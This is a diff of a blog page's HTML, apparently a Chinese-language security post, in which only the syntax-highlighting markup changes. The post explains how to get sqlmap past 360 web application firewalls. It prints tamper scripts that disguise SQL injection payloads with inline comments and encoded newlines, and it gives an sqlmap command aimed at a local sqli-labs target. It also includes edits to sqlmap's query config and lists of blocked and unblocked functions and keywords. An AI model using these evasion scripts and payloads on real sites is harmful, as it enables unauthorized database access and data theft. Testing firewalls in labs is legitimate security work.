@@ -97,7 +97,7 @@
 54
 55
 56
-57</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+57</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 
 <span class="sd">&quot;&quot;&quot;</span>
 <span class="sd">Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)</span>
@@ -132,12 +132,12 @@
 
     <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
         <span class="n">retVal</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
-        <span class="n">quote</span><span class="p">,</span> <span class="n">doublequote</span><span class="p">,</span> <span class="n">firstspace</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span>
+        <span class="n">quote</span><span class="p">,</span> <span class="n">doublequote</span><span class="p">,</span> <span class="n">firstspace</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span>
 
-        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
             <span class="k">if</span> <span class="ow">not</span> <span class="n">firstspace</span><span class="p">:</span>
                 <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">isspace</span><span class="p">():</span>
-                    <span class="n">firstspace</span> <span class="o">=</span> <span class="bp">True</span>
+                    <span class="n">firstspace</span> <span class="o">=</span> <span class="kc">True</span>
                     <span class="n">retVal</span> <span class="o">+=</span> <span class="s2">&quot;/**s**/&quot;</span>
                     <span class="k">continue</span>
 
@@ -154,7 +154,7 @@
             <span class="n">retVal</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
 
     <span class="k">return</span> <span class="n">retVal</span>
-</pre></div>
+</code></pre></div>
 </td></tr></table>
 
 <p>米有神马技术含量，然后是绕过数字卫士的，这个得分个类，UNION和Error注入，对于这样的注入需要修改以下的步骤：
@@ -213,7 +213,7 @@
 52
 53
 54
-55</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+55</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 
 <span class="sd">&quot;&quot;&quot;</span>
 <span class="sd">Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)</span>
@@ -268,7 +268,7 @@
         <span class="n">retVal</span> <span class="o">=</span> <span class="n">retVal</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; /*!50001*/&quot;</span><span class="p">,</span> <span class="s2">&quot;/*!50001*/&quot;</span><span class="p">)</span>
 
     <span class="k">return</span> <span class="n">retVal</span>
-</pre></div>
+</code></pre></div>
 </td></tr></table>
 
 <blockquote>
@@ -279,31 +279,31 @@
 </blockquote>
 <p>由于主机卫士会拦截cast，修改sqlmap的配置文件:<code>sqlmap/xml/queries.xml</code>,先备份，然后修改第6行的内容<code>&lt;cast query="CAST(%s AS CHAR)"/&gt;</code>，修改为<code>&lt;cast query="%s"/&gt;</code>。</p>
 <p>这个时候，在注入的时候需要指定<code>--technique</code>为E或者U，盲注在这种情况下是不行的，因为会拦截ord函数。</p>
-<div class="highlight"><pre><span></span><span class="n">sqlmap</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">141</span><span class="p">.</span><span class="mi">200</span><span class="o">/</span><span class="n">sqli</span><span class="o">-</span><span class="n">labs</span><span class="o">/</span><span class="k">Less</span><span class="o">-</span><span class="mi">1</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="err">\</span><span class="o">?</span><span class="n">id</span><span class="err">\</span><span class="o">=</span><span class="mi">1</span> <span class="c1">--tamper fuck360.py -v 3 --dbs    --union-col 3 --threads 5 --password --technique E --flush-session</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">sqlmap.py -u http://192.168.141.200/sqli-labs/Less-1/index.php\?id\=1 --tamper fuck360.py -v 3 --dbs    --union-col 3 --threads 5 --password --technique E --flush-session</span>
+</code></pre></div>
 
 
 <p>盲注bypass的尝试:
 * 在<code>sqlmap/txt/keywords.txt</code>里面添加了<code>SLEEP</code>，就是在注入的时候，添加SLEEP为关键词注释掉</p>
 <p>因为在注入的时候同样使用了ord函数。
 盲注的函数，</p>
-<div class="highlight"><pre><span></span><span class="n">pow</span><span class="p">()</span> <span class="err">计算平方的，对于字母来说貌似结果都一样</span> <span class="n">pass</span>
-<span class="n">pi</span><span class="p">()</span>
-<span class="n">exp</span><span class="p">()</span> <span class="err">以</span><span class="n">e为底的指函数</span>
-<span class="n">ceil</span><span class="p">()</span> <span class="err">向上取整</span>
-<span class="n">sqrt</span><span class="p">()</span> <span class="err">给定值的平方根</span>
-<span class="n">floor</span><span class="p">()</span> <span class="err">向下取整</span>
-<span class="n">ceiling</span><span class="p">()</span> <span class="err">向上取整</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">pow() 计算平方的，对于字母来说貌似结果都一样 pass</span>
+<span class="err">pi()</span>
+<span class="err">exp() 以e为底的指函数</span>
+<span class="err">ceil() 向上取整</span>
+<span class="err">sqrt() 给定值的平方根</span>
+<span class="err">floor() 向下取整</span>
+<span class="err">ceiling() 向上取整</span>
+</code></pre></div>
 
 
 <p>被拦截的函数，</p>
-<div class="highlight"><pre><span></span><span class="n">ascii</span><span class="p">()</span>
-<span class="n">hex</span><span class="p">()</span>
-<span class="n">unhex</span><span class="p">()</span>
-<span class="n">ord</span><span class="p">()</span>
-<span class="nb">char</span><span class="p">()</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">ascii()</span>
+<span class="err">hex()</span>
+<span class="err">unhex()</span>
+<span class="err">ord()</span>
+<span class="err">char()</span>
+</code></pre></div>
 
 
 <p>参考<a href="http://www.cnblogs.com/xiaozi/p/7275134.html">http://www.cnblogs.com/xiaozi/p/7275134.html</a>这篇文章里面的替换:</p>
@@ -332,7 +332,7 @@
 23
 24
 25
-26</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+26</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 
 <span class="sd">&quot;&quot;&quot;</span>
 <span class="sd">write by Aaron</span>
@@ -349,16 +349,16 @@
 <span class="sd">    &#39;union%0a/*!12345select*/id%0a/*!12345from*/users&#39;</span>
 <span class="sd">    &quot;&quot;&quot;</span>
     <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
-        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; ALL SELECT &quot;</span><span class="p">,</span><span class="s2">&quot;%0a/*!12345select*/&quot;</span><span class="p">)</span>
-        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;UNION SELECT&quot;</span><span class="p">,</span><span class="s2">&quot;union%0a/*!12345select*/&quot;</span><span class="p">)</span>
-        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; FROM &quot;</span><span class="p">,</span><span class="s2">&quot;%0a/*!12345from*/&quot;</span><span class="p">)</span>
+        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; ALL SELECT &quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">%0a</span><span class="s2">/*!12345select*/&quot;</span><span class="p">)</span>
+        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;UNION SELECT&quot;</span><span class="p">,</span><span class="s2">&quot;union</span><span class="si">%0a</span><span class="s2">/*!12345select*/&quot;</span><span class="p">)</span>
+        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; FROM &quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">%0a</span><span class="s2">/*!12345from*/&quot;</span><span class="p">)</span>
         <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;CONCAT&quot;</span><span class="p">,</span><span class="s2">&quot;CONCAT</span><span class="si">%23%</span><span class="s2">0a&quot;</span><span class="p">)</span>
         <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;CASE &quot;</span><span class="p">,</span><span class="s2">&quot;CASE</span><span class="si">%23%</span><span class="s2">0a&quot;</span><span class="p">)</span>
         <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;CAST(&quot;</span><span class="p">,</span><span class="s2">&quot;/*!12345CASt(*/&quot;</span><span class="p">)</span>
-        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;DATABASE()&quot;</span><span class="p">,</span><span class="s2">&quot;database%0a()&quot;</span><span class="p">)</span>
+        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;DATABASE()&quot;</span><span class="p">,</span><span class="s2">&quot;database</span><span class="si">%0a</span><span class="s2">()&quot;</span><span class="p">)</span>
 
     <span class="k">return</span> <span class="n">payload</span>
-</pre></div>
+</code></pre></div>
 </td></tr></table>
 
 <p>所以只要把ORD函数給注释包含就可以。</p>
@@ -377,15 +377,15 @@ select from 拦截
 select all 不拦截
 updatexml select 拦截</p>
 <p>注释:</p>
-<div class="highlight"><pre><span></span><span class="o">#</span>
-<span class="c1">-- </span>
-<span class="c1">-- -</span>
-<span class="c1">--+</span>
-<span class="o">//</span>
-<span class="cm">/**/</span>
-<span class="cm">/*abcd*/</span>
-<span class="p">;</span><span class="o">%</span><span class="mi">00</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">#</span>
+<span class="err">-- </span>
+<span class="err">-- -</span>
+<span class="err">--+</span>
+<span class="err">//</span>
+<span class="err">/**/</span>
+<span class="err">/*abcd*/</span>
+<span class="err">;%00</span>
+</code></pre></div>
 
 
 <p>空白字符：</p>
@@ -394,12 +394,12 @@ updatexml select 拦截</p>
 concat
 concat_ws</p>
 <p>除去GET以外，其他过滤最弱。</p>
-<div class="highlight"><pre><span></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">|</span><span class="nv">@pwd</span><span class="err">:</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span>
-<span class="n">id</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span><span class="cm">/*ddd*/</span><span class="ow">union</span><span class="cm">/*ddd*/</span><span class="k">select</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="nv">@pwd</span><span class="w"></span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">id=1|@pwd:=(select user from users where </span>
+<span class="err">id=4)/*ddd*/union/*ddd*/select null,@pwd</span>
+</code></pre></div>
 
 
-<div class="highlight"><pre><span></span><span class="k">union</span> <span class="k">select</span> <span class="err">拦截</span>
+<div class="highlight"><pre><span></span><code><span class="k">union</span> <span class="k">select</span> <span class="err">拦截</span>
 <span class="k">select</span> <span class="k">from</span> <span class="err">拦截</span>
 <span class="n">updatexml</span> <span class="k">select</span> <span class="err">拦截</span>
 <span class="k">select</span> <span class="k">all</span> <span class="k">from</span> <span class="err">拦截</span>
@@ -410,7 +410,7 @@ concat_ws</p>
 <span class="k">select</span> <span class="k">all</span> <span class="err">不拦截</span>
 <span class="k">select</span> <span class="k">union</span> <span class="err">不拦截</span> 
 <span class="k">union</span> <span class="k">from</span> <span class="err">不拦截</span>
-</pre></div>
+</code></pre></div>
     </div><!-- /.entry-content -->
 
   </article>
